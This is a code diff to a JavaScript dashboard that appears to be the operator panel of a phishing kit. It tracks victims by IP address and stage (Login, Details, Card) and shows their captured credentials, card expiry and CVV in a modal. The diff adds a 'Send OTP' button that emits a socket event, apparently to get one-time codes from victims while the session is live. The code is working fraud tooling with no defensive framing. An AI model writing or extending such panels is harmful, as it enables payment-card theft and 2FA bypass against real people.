@@ -141,14 +141,28 @@
         color = details.status === 'actif' ? 'success' : 'danger'; // Use success for actif, danger otherwise
     }
             const row = document.createElement('tr');
+          if(details.stage == 'Login' || details.stage == 'Details' || details.stage == 'Card'){
             row.innerHTML = `
                 <td><span class="badge bg-${color}">${details.status}</span></td>
                 <td>${ipAddress}</td>
                 <td>${details.page || ''}</td>
                 <td>${details.stage || ''}</td>
-                <td><button class="btn btn-primary">Results</button></td> <!-- Action column -->
+                <td><button class="btn btn-primary">Results</button>  <button class="btn btn-warning send-otp-button">Send OTP</button> </td> <!-- Action column -->
             `;
-                  let resultsButton = row.querySelector('button');
+          } else {
+            row.innerHTML = `
+                <td><span class="badge bg-${color}">${details.status}</span></td>
+                <td>${ipAddress}</td>
+                <td>${details.page || ''}</td>
+                <td>${details.stage || ''}</td>
+                <td><button class="btn btn-primary results-button">Results</button></td> <!-- Action column -->
+            `;
+            }
+                  let resultsButton = row.querySelector('.results-button');
+                  let sendOtpButton = row.querySelector('.send-otp-button');
+          sendOtpButton.addEventListener('click', function() {
+            socket.emit('sendOTP')
+          });
         resultsButton.addEventListener('click', function() {
              let modalBody = document.querySelector('#resultsModal .modal-body');
           let ipModel = ipAddress
@@ -158,6 +172,7 @@
                userData.forEach(([ipAddress, details]) => {
                  if(details.ip == ipModel){
                    if(details.getUserDataLogin || details.getUserDataDetails || details.getUserDataCard  ){
+          
                      modalBody.innerHTML = `   <div class="card">
         <div class="card-header">
             IP: ${ipAddress}
@@ -173,6 +188,7 @@
             <li class="list-group-item">Exp: ${details.getUserDataCard.exp1 || 'N/A'}/${details.getUserDataCard.exp1 || 'N/A'}</li>
             <li class="list-group-item">Cvv: ${details.getUserDataCard.cvv || 'N/A'}</li>
         </ul> </div>`;
+
                    } else {
                      modalBody.innerHTML = `No result for IP: ${ipAddress}`;
                    }
